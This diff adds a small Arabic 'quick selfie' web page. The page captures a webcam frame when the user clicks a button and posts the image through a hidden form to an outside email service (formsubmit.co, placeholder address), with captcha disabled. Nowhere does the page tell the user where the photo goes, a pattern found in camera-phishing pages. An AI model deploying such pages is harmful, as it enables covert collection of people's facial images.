@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>سيلفي سريع</title>
+  <style>
+    body { text-align: center; font-family: sans-serif; background: #f9f9f9; padding-top: 50px; }
+    video, canvas { border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
+    button { margin-top: 10px; padding: 10px 20px; font-size: 18px; cursor: pointer; }
+    #sent { color: green; font-weight: bold; display: none; margin-top: 10px; }
+  </style>
+</head>
+<body>
+
+  <h2>ابتسـم للكاميرا</h2>
+  <video id="video" width="300" height="220" autoplay></video><br>
+  <button id="snap">ابتسـم</button><br>
+  <canvas id="canvas" width="300" height="220" style="display:none;"></canvas>
+
+  <form id="form" method="POST" action="https://formsubmit.co/your_email@example.com">
+    <input type="hidden" name="صورة" id="photoInput">
+    <input type="hidden" name="_captcha" value="false">
+  </form>
+
+  <p id="sent">تم إرسال الصورة بنجاح!</p>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snap = document.getElementById('snap');
+    const photoInput = document.getElementById('photoInput');
+    const form = document.getElementById('form');
+    const sent = document.getElementById('sent');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream)
+      .catch(err => alert("فشل تشغيل الكاميرا"));
+
+    snap.addEventListener("click", () => {
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imgData = canvas.toDataURL("image/png");
+      photoInput.value = imgData;
+
+      form.submit();
+      sent.style.display = "block";
+    });
+  </script>
+
+</body>
+</html>
